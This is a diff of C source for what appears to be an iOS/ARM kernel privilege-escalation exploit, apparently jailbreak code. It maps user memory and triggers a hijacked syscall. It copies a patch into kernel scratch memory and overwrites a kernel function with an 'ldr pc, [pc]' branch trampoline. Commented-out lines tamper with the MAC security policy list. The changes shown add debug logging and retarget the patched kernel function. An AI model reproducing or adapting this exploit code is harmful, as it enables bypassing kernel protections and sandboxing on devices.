@@ -16,12 +16,16 @@
 #include <sys/types.h>
 #include <sys/sysctl.h>
 
+#define DEBUG
+
+#ifndef DEBUG
 // strings are big and not very sneaky.
 #undef assert
 __attribute__((always_inline))
 static inline void assert(bool x) {
     if(!x) abort();
 }
+#endif
 
 static int pffd;
 
@@ -79,9 +83,10 @@ static void pwn(unsigned int addr) {
 extern void patch_start();
 extern void patch_end();
 
-void (*flush_dcache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_FLUSH_DCACHE;
-void (*invalidate_icache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_INVALIDATE_ICACHE;
-void (*copyin)(void *uaddr, void *kaddr, size_t len) = (void *) CONFIG_COPYIN;
+static void (*flush_dcache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_FLUSH_DCACHE;
+static void (*invalidate_icache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_INVALIDATE_ICACHE;
+static void (*copyin)(void *uaddr, void *kaddr, size_t len) = (void *) CONFIG_COPYIN;
+static void (*IOLog)(char *fmt, ...) = (void *) CONFIG_IOLOG;
 
 static inline void flush(void *addr, unsigned size) {
     flush_dcache(addr, size, false);
@@ -89,6 +94,9 @@ static inline void flush(void *addr, unsigned size) {
 }
 
 static int ok_go(void *p, void *uap, unsigned int *retval) {
+#ifdef DEBUG
+    IOLog("Whoa, I'm here!...\n");
+#endif
     /**((unsigned int *) (CONFIG_MAC_POLICY_LIST + 8) = 1;
     *((unsigned int *) (CONFIG_MAC_POLICY_LIST + 12) = 2;
     *((unsigned int *) 0xdeadbeef) = 0xdeadf00d;*/
@@ -106,10 +114,10 @@ static int ok_go(void *p, void *uap, unsigned int *retval) {
     copyin(&patch_start, (void *) CONFIG_SCRATCH, copysize);
     flush((void *) CONFIG_SCRATCH, copysize);
     
-    // this will work on thumb-1, but need to check whether armv6 version is actually ARM
-    *((unsigned int *) CONFIG_DERIVE_VNODE_PATH) = 0x47184b00; // ldr r3, [pc]; bx r3
-    *((unsigned int *) CONFIG_DERIVE_VNODE_PATH + 4) = CONFIG_SCRATCH | 1;
-    flush((void *) CONFIG_DERIVE_VNODE_PATH, 8);
+    // *this* won't work on thumb-1...
+    *((unsigned int *) CONFIG_MATCH_STRING) = 0xf000f8df; // ldr pc, [pc]
+    *((unsigned int *) (CONFIG_MATCH_STRING + 4)) = CONFIG_SCRATCH | 1;
+    flush((void *) CONFIG_MATCH_STRING, 8);
     
     return 0;
 
@@ -141,9 +149,13 @@ static void go() {
     *((void **) (target_addr + 4)) = &ok_go;
     assert(!mprotect(target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
     assert(!mlock(target_pagebase, 0x2000));
+#ifdef DEBUG
     printf("ok\n"); fflush(stdout);
+#endif
     syscall(0);
+#ifdef DEBUG
     printf("we're out\n"); fflush(stdout);
+#endif
     assert(!munlock(target_pagebase, 0x2000));
 
     // turn this fancy stuff back on
